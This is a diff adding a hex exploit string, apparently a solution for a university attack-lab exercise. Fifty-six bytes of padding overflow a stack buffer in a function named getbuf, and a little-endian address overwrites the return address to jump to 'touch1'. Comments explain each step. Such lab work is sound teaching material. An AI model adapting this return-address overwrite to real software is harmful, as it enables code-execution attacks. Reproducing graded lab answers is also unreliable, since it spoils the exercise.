@@ -1,0 +1,9 @@
+00 00 00 00 00 00 00 00 /* 7 lines of junk = 56 bytes = 0x38 , 8 bytes per line. */
+00 00 00 00 00 00 00 00	
+00 00 00 00 00 00 00 00	
+00 00 00 00 00 00 00 00	
+00 00 00 00 00 00 00 00	
+00 00 00 00 00 00 00 00	
+00 00 00 00 00 00 00 00	/* this overflows the buffer, getbuf called 'sub $0x38, %rsp'
+42 18 40 00 00 00 00 00 /* address of touch1, in little endian */
+
